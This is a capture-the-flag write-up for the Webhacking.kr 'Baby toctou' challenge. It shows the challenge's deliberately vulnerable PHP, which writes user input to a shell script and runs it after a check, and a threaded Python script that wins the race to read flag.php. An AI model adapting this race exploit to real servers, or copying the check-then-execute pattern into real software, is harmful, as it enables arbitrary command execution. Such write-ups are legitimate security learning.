# [Webhacking.kr] Baby toctou writeup

## Introduction

I decided to give myself a try on this challenge which was solved my only 42 people at the time. I thought it would be a challenging (and interesting) one. In the end this one was not that hard, but surely an interesting one.

## First look

```php
<?php
  // system($_GET['q']);
  if(!preg_match('/^[a-f0-9]+$/',$_COOKIE['baby_toctou'])){ $newCookie = uniqid().rand(1,999999999); setcookie("baby_toctou",$newCookie); $_COOKIE['baby_toctou'] = $newCookie; }
  $cmd = $_GET['q'];
  $myfile = fopen("user/{$_COOKIE['baby_toctou']}.sh", "w") or die("Unable to open file!");
  fwrite($myfile, $cmd);
  fclose($myfile);
  if(($cmd === "ls") || ($cmd === "cat api.php") || ($cmd === "cat index.php")){ // valid check
    sleep(1); // my server is small and weak
    system("sh ./user/{$_COOKIE['baby_toctou']}.sh");
  }
  else{
    echo <<<HELP
only "ls", "cat api.php", "cat index.php" allowed
HELP;
  }
?>
```

This `api.php` simply write the command you want to execute into a file named by the `baby_toctou` cookie. After writing the file, it checks the command before executing the file.
Nothing's wrong with the `if` check, so what could go wrong?

## Race condition

Now what if we change the content of the file after the `if` condition successes? We have a generously 1 second for that.

But how can we? Isn't the program running top-down?

What if we have 2 people P1 and P2, one executes, and one edits the content?
Here's the idea:

| Step | P1                              | P2                                |
| ---- | ------------------------------- | --------------------------------- |
| 1    | Writes `ls` to the file         | -                                 |
| 2    | Passes the if check             | -                                 |
| 3    | Waits 1 second before executing | Writes `cat flag.php` to the file |
| 4    | Executes the file               | Fails the if check                |

Easy!

## Exploit

There's nothing to talk about this, but I'll post my code here.

```python
import requests, threading, time

def send(cmd):
    cookies = {
        'PHPSESSID': 'ofq76t3822i5ee1plskj2bafmt',
        'baby_toctou': 'abc91',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        # 'Cookie': 'PHPSESSID=ofq76t3822i5ee1plskj2bafmt; baby_toctou=abc91',
        'DNT': '1',
        'Referer': 'http://webhacking.kr:10019/',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    }

    params = {
        'q': cmd,
    }

    response = requests.get('http://webhacking.kr:10019/api.php', params=params, cookies=cookies, headers=headers, verify=False)
    print(response.text)

u1 = threading.Thread(target=send, args=('ls',))
u2 = threading.Thread(target=send, args=('cat flag.php',))


print('[info] getting in ...')

u1.start()
time.sleep(0.25)
u2.start()
```

## Conclusion

This challenge helped me develop my sense of a non-linear attack. Always think of a multi-user situation!
